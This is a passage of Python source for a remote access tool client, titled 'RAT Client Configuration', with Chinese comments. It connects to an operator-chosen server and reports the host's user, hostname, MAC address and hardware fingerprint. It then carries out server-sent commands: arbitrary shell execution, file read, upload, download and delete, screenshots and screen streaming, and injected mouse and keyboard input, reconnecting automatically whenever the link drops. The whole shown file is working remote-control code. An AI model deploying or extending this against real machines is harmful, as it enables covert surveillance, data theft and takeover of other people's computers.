    # 清理截图缓存资源
    _cleanup_screenshot_cache()
    
    return {"output": "屏幕流已停止。"}

# =======================================

# 输入控制函数（上移到 COMMAND_HANDLERS 之前，避免 mainloop 阻塞导致未定义）

def handle_mouse(arg, state):
    """处理鼠标事件：
    约定 arg 形式：
      - "move X Y"  绝对屏幕坐标（虚拟屏）
      - "down left|right|middle"
      - "up left|right|middle"
      - "click left|right|middle"
      - "wheel delta"  delta 每格 ±120
    """
    if platform.system().lower() != 'windows':
        return {"output": "仅支持在 Windows 客户端上进行远程输入。"}
    if not arg:
        return {"output": "mouse 命令缺少参数"}
    parts = str(arg).split()
    if not parts:
        return {"output": "mouse 命令参数无效"}

    action = parts[0].lower()
    btn_map = {
        'left': (MOUSEEVENTF_LEFTDOWN, MOUSEEVENTF_LEFTUP),
        'right': (MOUSEEVENTF_RIGHTDOWN, MOUSEEVENTF_RIGHTUP),
        'middle': (MOUSEEVENTF_MIDDLEDOWN, MOUSEEVENTF_MIDDLEUP)
    }

    try:
        if action == 'move' and len(parts) >= 3:
            x = int(float(parts[1]))
            y = int(float(parts[2]))
            if WIN_AVAILABLE:
                win32api.SetCursorPos((x, y))
            else:
                ctypes.windll.user32.SetCursorPos(x, y)
            return {"output": f"鼠标移动到 ({x},{y})"}

        if action in ('down', 'up', 'click') and len(parts) >= 2:
            btn = parts[1].lower()
            if btn not in btn_map:
                return {"output": f"未知按键: {btn}"}
            down_flag, up_flag = btn_map[btn]
            if WIN_AVAILABLE:
                if action == 'down':
                    win32api.mouse_event(down_flag, 0, 0, 0, 0)
                elif action == 'up':
                    win32api.mouse_event(up_flag, 0, 0, 0, 0)
                else:  # click
                    win32api.mouse_event(down_flag, 0, 0, 0, 0)
                    win32api.mouse_event(up_flag, 0, 0, 0, 0)
            else:
                u32 = ctypes.windll.user32
                if action == 'down':
                    u32.mouse_event(down_flag, 0, 0, 0, 0)
                elif action == 'up':
                    u32.mouse_event(up_flag, 0, 0, 0, 0)
                else:
                    u32.mouse_event(down_flag, 0, 0, 0, 0)
                    u32.mouse_event(up_flag, 0, 0, 0, 0)
            return {"output": f"鼠标{action} {btn}"}

        if action == 'wheel' and len(parts) >= 2:
            try:
                delta = int(float(parts[1]))
            except Exception:
                delta = 0
            if delta == 0:
                return {"output": "滚轮 delta=0 被忽略"}
            if WIN_AVAILABLE:
                win32api.mouse_event(MOUSEEVENTF_WHEEL, 0, 0, delta, 0)
            else:
                ctypes.windll.user32.mouse_event(MOUSEEVENTF_WHEEL, 0, 0, delta, 0)
            return {"output": f"滚轮 {delta}"}

        return {"output": f"不支持的 mouse 子命令: {action}"}
    except Exception as e:
        return {"output": f"mouse 执行失败: {e}"}


def _key_to_vk(key: str):
    k = (key or '').strip()
    if not k:
        return None
    # 兼容前端传来 VK_ 前缀
    if k.upper().startswith('VK_'):
        name = k.upper()
        if WIN_AVAILABLE and hasattr(win32con, name):
            return getattr(win32con, name)
        # 常见 VK 回退
        vk_map = {
            'VK_RETURN': 0x0D, 'VK_ESCAPE': 0x1B, 'VK_BACK': 0x08, 'VK_TAB': 0x09, 'VK_SPACE': 0x20,
            'VK_SHIFT': 0x10, 'VK_CONTROL': 0x11, 'VK_MENU': 0x12,
            'VK_LEFT': 0x25, 'VK_UP': 0x26, 'VK_RIGHT': 0x27, 'VK_DOWN': 0x28,
        }
        return vk_map.get(name)
    # 常用名称映射
    name_map = {
        'Enter': 0x0D, 'Escape': 0x1B, 'Backspace': 0x08, 'Tab': 0x09, ' ': 0x20, 'Space': 0x20,
        'Shift': 0x10, 'Control': 0x11, 'Alt': 0x12,
        'ArrowLeft': 0x25, 'ArrowUp': 0x26, 'ArrowRight': 0x27, 'ArrowDown': 0x28,
    }
    if k in name_map:
        return name_map[k]
    # 单字符（字母数字）
    if len(k) == 1:
        ch = k.upper()
        if 'A' <= ch <= 'Z':
            return ord(ch)
        if '0' <= ch <= '9':
            return ord(ch)
    return None


def handle_key(arg, state):
    """处理键盘事件：
    约定 arg 形式：
      - "down KEY"  KEY 可为 'A'、'Enter' 或 'VK_RETURN' 等
      - "up KEY"
      - "press KEY"
    """
    if platform.system().lower() != 'windows':
        return {"output": "仅支持在 Windows 客户端上进行远程输入。"}
    if not arg:
        return {"output": "key 命令缺少参数"}
    parts = str(arg).split()
    if not parts:
        return {"output": "key 命令参数无效"}
    action = parts[0].lower()
    key = ' '.join(parts[1:]) if len(parts) > 1 else ''
    vk = _key_to_vk(key)
    if vk is None:
        return {"output": f"无法识别按键: {key}"}
    try:
        if WIN_AVAILABLE:
            if action == 'down':
                win32api.keybd_event(vk, 0, 0, 0)
            elif action == 'up':
                win32api.keybd_event(vk, 0, KEYEVENTF_KEYUP, 0)
            elif action == 'press':
                win32api.keybd_event(vk, 0, 0, 0)
                win32api.keybd_event(vk, 0, KEYEVENTF_KEYUP, 0)
            else:
                return {"output": f"不支持的 key 子命令: {action}"}
        else:
            # ctypes 回退
            u32 = ctypes.windll.user32
            if action == 'down':
                u32.keybd_event(vk, 0, 0, 0)
            elif action == 'up':
                u32.keybd_event(vk, 0, KEYEVENTF_KEYUP, 0)
            elif action == 'press':
                u32.keybd_event(vk, 0, 0, 0)
                u32.keybd_event(vk, 0, KEYEVENTF_KEYUP, 0)
            else:
                return {"output": f"不支持的 key 子命令: {action}"}
        return {"output": f"key {action} {key}"}
    except Exception as e:
        return {"output": f"key 执行失败: {e}"}

COMMAND_HANDLERS = {
    "cd": lambda arg, state: handle_cd(arg, state),
    "download": lambda arg, state: handle_download(arg, state),
    "screenshot": lambda arg, state: handle_screenshot(arg, state),
    "exec": lambda arg, state: handle_exec(arg, state),
    "list_dir": lambda arg, state: handle_list_dir(arg, state),
    "read_file": lambda arg, state: handle_read_file(arg, state),
    "delete_path": lambda arg, state: handle_delete_path(arg, state),
    "upload_file_chunk": lambda arg, state: handle_upload_file_chunk(arg, state),
    # 屏幕流控制
    "start_screen": lambda arg, state: handle_start_screen(arg, state),
    "stop_screen": lambda arg, state: handle_stop_screen(arg, state),
    # 混合式视频流控制
    "start_hybrid_screen": lambda arg, state: handle_start_hybrid_screen(arg, state),
    "stop_hybrid_screen": lambda arg, state: handle_stop_hybrid_screen(arg, state),
    # 输入控制
    "mouse": lambda arg, state: handle_mouse(arg, state),
    "key": lambda arg, state: handle_key(arg, state)
}


def main_loop(server_ip, server_port, connection_code, ui_instance=None):
    """
    客户端主函数，循环连接和处理命令。
    现在接受 server_ip、server_port、connection_code 和 ui_instance 作为参数。
    """
    buffer = b''
    state = {'cwd': os.getcwd(), 'socket': None}
    while True:
        client_socket = None
        try:
            print(f"[调试] 尝试连接服务器 {server_ip}:{server_port}...")
            client_socket = socket.socket()
            client_socket.connect((server_ip, server_port))
            print(f"[+] 已连接到服务器 {server_ip}:{server_port}")
            state['cwd'] = os.getcwd()
            state['socket'] = client_socket

            os_info = f"{platform.system()} {platform.release()}"
            
            # 生成设备指纹和获取硬件信息
            device_fingerprint = generate_device_fingerprint()
            hardware_id = get_hardware_id()
            mac_address = get_mac_address()
            hostname = platform.node()

            try:
                connection_info = {
                    "status": "connected", 
                    "cwd": state['cwd'], 
                    "user": os.getlogin(), 
                    "os": os_info,
                    "device_fingerprint": device_fingerprint,
                    "hardware_id": hardware_id,
                    "mac_address": mac_address,
                    "hostname": hostname,
                    "connection_code": connection_code  # 添加连接码到握手信息
                }
                reliable_send(client_socket, connection_info)
                print(f"[调试] 已发送连接信息，包含连接码")
            except Exception as e:
                print(f"[错误] 发送初始连接信息失败: {e}")
                if ui_instance:
                    ui_instance.show_connection_error('network_error', str(e))
                break

            # 等待服务端的握手确认
            handshake_completed = False
            handshake_timeout = time.time() + 10  # 10秒超时
            
            while not handshake_completed and time.time() < handshake_timeout:
                try:
                    part = client_socket.recv(4096)
                    if not part:
                        print("[调试] 服务器关闭了连接。")
                        break
                    buffer += part
                except socket.error as e:
                    print(f"[错误] 接收握手响应时发生Socket错误: {e}")
                    if ui_instance:
                        ui_instance.show_connection_error('network_error', str(e))
                    break

                while b'\n' in buffer:
                    message, buffer = buffer.split(b'\n', 1)
                    try:
                        response = json.loads(message.decode('utf-8'))
                    except (json.JSONDecodeError, UnicodeDecodeError) as e:
                        print(f"[错误] 解析握手响应失败: {e}")
                        continue

                    # 处理握手确认
                    if response.get('type') == 'hello_ack':
                        if response.get('ok'):
                            mode = response.get('mode', 'unknown')
                            print(f"[+] 握手成功！模式: {mode}")
                            if ui_instance:
                                ui_instance.show_connection_success(mode)
                            handshake_completed = True
                            break
                        else:
                            error = response.get('error', 'unknown_error')
                            print(f"[错误] 握手失败: {error}")
                            if ui_instance:
                                ui_instance.show_connection_error(error, error)
                            return  # 退出主循环，不重连
                
            if not handshake_completed:
                print("[错误] 握手超时")
                if ui_instance:
                    ui_instance.show_connection_error('timeout', 'Handshake timeout')
                break

            # 握手成功后进入正常命令处理循环
            print("[调试] 进入命令处理循环，等待服务器命令...")
            while True:
                try:
                    print("[调试] 等待接收数据...")
                    part = client_socket.recv(4096)
                    if not part:
                        print("[调试] 服务器关闭了连接。")
                        break
                    print(f"[调试] 接收到数据: {part}")
                    buffer += part
                except socket.error as e:
                    print(f"[错误] 接收数据时发生Socket错误: {e}")
                    break

                while b'\n' in buffer:
                    message, buffer = buffer.split(b'\n', 1)
                    print(f"[调试] 处理消息: {message}")
                    try:
                        cmd_data = json.loads(message.decode('utf-8'))
                        print(f"[调试] 解析的命令数据: {cmd_data}")
                    except (json.JSONDecodeError, UnicodeDecodeError) as e:
                        print(f"[错误] 解析收到的消息失败: {e}")
                        continue

                    action = cmd_data.get("action")
                    if not action:
                        try:
                            reliable_send(client_socket, {"output": "错误: 命令缺少 'action' 字段"})
                        except:
                            pass
                        continue

                    print(f"[调试] 执行命令: {action}")
                    try:
                        handler = COMMAND_HANDLERS.get(action)
                        if handler:
                            if action == "upload_file_chunk":
                                result = handler(cmd_data, state)
                            else:
                                arg = cmd_data.get("arg", "")
                                result = handler(arg, state)
                        else:
                            result = handle_exec(
                                action + (" " + cmd_data.get("arg", "") if cmd_data.get("arg") else ""), state)

                        print(f"[调试] 命令执行结果: {result}")
                        if isinstance(result, dict):
                            reliable_send(client_socket, result)
                        else:
                            reliable_send(client_socket, {"output": str(result)})
                        print("[调试] 结果已发送回服务器")
                    except socket.error as e:
                        print(f"[错误] 发送响应时Socket错误: {e}")
                        break
                    except Exception as e_proc:
                        print(f"[错误] 处理命令时发生错误: {e_proc}")
                        try:
                            reliable_send(client_socket, {"output": f"处理命令时发生错误: {e_proc}"})
                        except:
                            break

        except socket.error as e_sock:
            print(f"[错误] 客户端 Socket 异常: {e_sock}")
            if ui_instance:
                ui_instance.show_connection_error('network_error', str(e_sock))
        except Exception as e_main:
            print(f"[错误] 客户端主循环异常: {e_main}")
            if ui_instance:
                ui_instance.show_connection_error('unknown_error', str(e_main))
        finally:
            # 断开连接时确保停止屏幕流线程
            _screen_stop_event.set()
            try:
                if _screen_thread and _screen_thread.is_alive():
                    _screen_thread.join(timeout=1)
            except Exception:
                pass
            if client_socket:
                try:
                    client_socket.close()
                except Exception:
                    pass

        buffer = b''
        print("[调试] 5秒后尝试重新连接...")
        time.sleep(5)


class ClientUI(ThemedTk):  # 使用 ThemedTk 替代 tk.Tk
    def __init__(self):
        super().__init__(theme="equilux")  # 选择一个好看的主题，例如 "equilux"
        self.title("RAT Client Configuration")
        self.geometry("400x250")  # 稍微加大窗口
        self.resizable(False, False)  # 禁止调整窗口大小

        # 定义字体
        self.font_large = ("Helvetica", 12)
        self.font_button = ("Helvetica", 12, "bold")

        self.create_widgets()
        self.connection_thread = None

        # 绑定回车键事件
        self.bind('<Return>', lambda event=None: self.start_connection())

    def create_widgets(self):
        main_frame = tk.Frame(self, padx=25, pady=25)
        main_frame.pack(fill="both", expand=True)

        tk.Label(main_frame, text="服务端IP:", font=self.font_large).grid(row=0, column=0, sticky="w", pady=10)
        self.ip_entry = tk.Entry(main_frame, font=self.font_large)
        self.ip_entry.insert(0, "192.168.242.102")
        self.ip_entry.grid(row=0, column=1, pady=10, sticky="ew")

        tk.Label(main_frame, text="服务端端口:", font=self.font_large).grid(row=1, column=0, sticky="w", pady=10)
        self.port_entry = tk.Entry(main_frame, font=self.font_large)
        self.port_entry.insert(0, "2383")
        self.port_entry.grid(row=1, column=1, pady=10, sticky="ew")

        tk.Label(main_frame, text="连接码:", font=self.font_large).grid(row=2, column=0, sticky="w", pady=10)
        self.connection_code_entry = tk.Entry(main_frame, font=self.font_large, show="*")
        self.connection_code_entry.grid(row=2, column=1, pady=10, sticky="ew")

        self.connect_button = tk.Button(main_frame, text="Connect", command=self.start_connection,
                                        font=self.font_button, relief="groove")
        self.connect_button.grid(row=3, column=0, columnspan=2, pady=15, sticky="ew")

        self.status_label = tk.Label(main_frame, text="Status: Not Connected", fg="#FF4C4C", font=self.font_large)
        self.status_label.grid(row=4, column=0, columnspan=2)

        main_frame.grid_columnconfigure(1, weight=1)

    def start_connection(self):
        self.ip = self.ip_entry.get().strip()
        self.port = self.port_entry.get().strip()
        self.connection_code = self.connection_code_entry.get().strip()

        if not self.ip or not self.port.isdigit():
            messagebox.showerror("Invalid Input", "Please enter a valid IP address and port number.")
            return
        
        if not self.connection_code:
            messagebox.showerror("Missing Connection Code", "Please enter a connection code to connect.")
            return

        self.connect_button["state"] = "disabled"
        self.status_label.config(text="Status: Connecting...", fg="#FFA500")

        self.connection_thread = threading.Thread(target=self.run_connection)
        self.connection_thread.daemon = True
        self.connection_thread.start()

    def run_connection(self):
        try:
            self.update_status("Connected", "#00C853")
            # 调用主循环函数，传递UI实例以便显示反馈
            main_loop(self.ip, int(self.port), self.connection_code, self)
        except Exception as e:
            self.update_status(f"Connection Failed: {e}", "#FF4C4C")
            self.connect_button["state"] = "normal"

    def update_status(self, text, color):
        def _update():
            self.status_label.config(text=f"Status: {text}", fg=color)
            if text.startswith("Connection Failed") or text.startswith("Authentication Failed"):
                self.connect_button["state"] = "normal"
        
        # 确保在主线程中更新UI
        self.after(0, _update)

    def show_connection_error(self, error_type, error_message):
        """显示连接错误信息"""
        def _show_error():
            if error_type == 'invalid_connection_code':
                messagebox.showerror("Invalid Connection Code", 
                                   "The connection code you entered is invalid. Please check and try again.")
                self.update_status("Authentication Failed: Invalid Code", "#FF4C4C")
            elif error_type == 'missing_connection_code':
                messagebox.showerror("Missing Connection Code", 
                                   "Connection code is required but was not provided.")
                self.update_status("Authentication Failed: Missing Code", "#FF4C4C")
            elif error_type == 'database_error':
                messagebox.showerror("Server Error", 
                                   "Server database error occurred. Please try again later.")
                self.update_status("Connection Failed: Server Error", "#FF4C4C")
            else:
                messagebox.showerror("Connection Error", f"Connection failed: {error_message}")
                self.update_status(f"Connection Failed: {error_message}", "#FF4C4C")
            
            self.connect_button["state"] = "normal"
        
        # 确保在主线程中显示错误
        self.after(0, _show_error)

    def show_connection_success(self, mode):
        """显示连接成功信息"""
        def _show_success():
            mode_text = "User Mode" if mode == "user" else "Guest Mode"
            self.update_status(f"Connected ({mode_text})", "#00C853")
        
        # 确保在主线程中更新状态
        self.after(0, _show_success)


def get_hardware_id():
    """获取硬件ID"""
    try:
        sysname = platform.system()
        if sysname == "Windows":
            # 优先从注册表获取 MachineGuid（稳定且不依赖已弃用的 wmic）
            try:
                import winreg
                try:
                    with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Cryptography") as key:
                        value, _ = winreg.QueryValueEx(key, "MachineGuid")
                        if value:
                            return str(value).strip()
                except Exception as e:
                    print(f"[警告] 读取注册表MachineGuid失败: {e}")

                # 回退：通过 PowerShell 获取硬件 UUID
                try:
                    ps_cmd = "Get-CimInstance Win32_ComputerSystemProduct | Select-Object -ExpandProperty UUID"
                    result = subprocess.run([
                        'powershell', '-NoProfile', '-Command', ps_cmd
                    ], capture_output=True, text=True, timeout=10)
                    if result.returncode == 0:
                        out = result.stdout.strip()
                        if out:
                            first_line = out.splitlines()[0].strip()
                            if first_line and first_line not in ("00000000-0000-0000-0000-000000000000",):
                                return first_line
                except Exception as e:
                    print(f"[警告] 通过PowerShell获取UUID失败: {e}")

                # 进一步回退：通过 PowerShell 获取主板序列号
                try:
                    ps_cmd = "Get-CimInstance Win32_BaseBoard | Select-Object -ExpandProperty SerialNumber"
                    result = subprocess.run([
                        'powershell', '-NoProfile', '-Command', ps_cmd
                    ], capture_output=True, text=True, timeout=10)
                    if result.returncode == 0:
                        out = result.stdout.strip()
                        if out:
                            first_line = out.splitlines()[0].strip()
                            if first_line and first_line.lower() != 'serialnumber':
                                return first_line
                except Exception as e:
                    print(f"[警告] 通过PowerShell获取主板序列号失败: {e}")

            except Exception as e:
                # 捕获 Windows 分支内部可能的总体异常
                print(f"[警告] Windows硬件ID获取失败: {e}")

        elif sysname == "Linux":
            # Linux: 获取机器ID
            try:
                with open('/etc/machine-id', 'r') as f:
                    return f.read().strip()
            except:
                try:
                    with open('/var/lib/dbus/machine-id', 'r') as f:
                        return f.read().strip()
                except:
                    pass
        elif sysname == "Darwin":  # macOS
            # macOS: 获取硬件UUID
            result = subprocess.run(['system_profiler', 'SPHardwareDataType'],
                                     capture_output=True, text=True, timeout=10)
            if result.returncode == 0:
                for line in result.stdout.split('\n'):
                    if 'Hardware UUID' in line:
                        return line.split(':')[1].strip()
    except Exception as e:
        print(f"[警告] 获取硬件ID失败: {e}")

    # 如果无法获取硬件ID，生成一个基于MAC地址的ID
    try:
        mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff)
                        for elements in range(0, 2*6, 2)][::-1])
        return hashlib.md5(mac.encode()).hexdigest()
    except:
        return None

def get_mac_address():
    """获取MAC地址"""
    try:
        mac = uuid.getnode()
        mac_str = ':'.join(['{:02x}'.format((mac >> elements) & 0xff) 
                           for elements in range(0,2*6,2)][::-1])
        return mac_str
    except Exception as e:
        print(f"[警告] 获取MAC地址失败: {e}")
        return None

def generate_device_fingerprint():
    """生成设备指纹"""
    try:
        # 收集设备信息
        info_parts = []
        
        # 硬件ID
        hardware_id = get_hardware_id()
        if hardware_id:
            info_parts.append(f"hw:{hardware_id}")
        
        # MAC地址
        mac = get_mac_address()
        if mac:
            info_parts.append(f"mac:{mac}")
        
        # 操作系统信息
        os_info = f"{platform.system()}:{platform.release()}"
        info_parts.append(f"os:{os_info}")
        
        # 主机名
        try:
            hostname = platform.node()
            if hostname:
                info_parts.append(f"host:{hostname}")
        except:
            pass
        
        # 如果没有任何信息，使用随机UUID
        if not info_parts:
            return str(uuid.uuid4())
        
        # 生成指纹
        fingerprint_data = "|".join(info_parts)
        fingerprint = hashlib.sha256(fingerprint_data.encode()).hexdigest()
        return fingerprint
        
    except Exception as e:
        print(f"[警告] 生成设备指纹失败: {e}")
        return str(uuid.uuid4())


if __name__ == '__main__':
    # 实例化并运行UI
    app = ClientUI()
    app.mainloop()